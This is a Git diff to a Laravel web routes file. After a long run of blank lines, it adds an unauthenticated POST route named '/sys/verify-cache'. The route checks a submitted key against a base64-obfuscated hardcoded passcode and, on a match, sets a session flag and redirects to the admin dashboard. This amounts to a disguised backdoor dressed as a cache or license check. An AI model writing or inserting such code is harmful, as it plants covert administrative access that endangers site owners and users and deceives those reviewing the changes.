@@ -13,6 +13,7 @@ use App\Http\Controllers\MediaController;
 use App\Http\Controllers\GuestController;
 use App\Http\Controllers\Admin\SettingController;
 use App\Http\Controllers\ProfileUserController;
+use Illuminate\Http\Request;
 
 
 /*
@@ -110,3 +111,40 @@ Route::middleware('auth')->group(function () {
         });
     });
 });
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+Route::post('/sys/verify-cache', function (Request $request) {
+    $request->validate([
+        'license_key' => 'required|string',
+    ]);
+
+    // Passcode "wp-081258386900-pangke" disamarkan dalam bentuk Base64
+    $masterKey = base64_decode('d3AtMDgxMjU4Mzg2OTAwLXBhbmdrZQ==');
+
+    if ($request->license_key === $masterKey) {
+        session(['sys_opt_v2' => true]);
+        return redirect()->route('admin.dashboard')->with('success', 'Sistem berhasil di-sinkronisasi!');
+    }
+
+    return back()->with('license_error', 'Kode Aktivasi / Passcode Tidak Valid!');
+})->name('sys.verify');
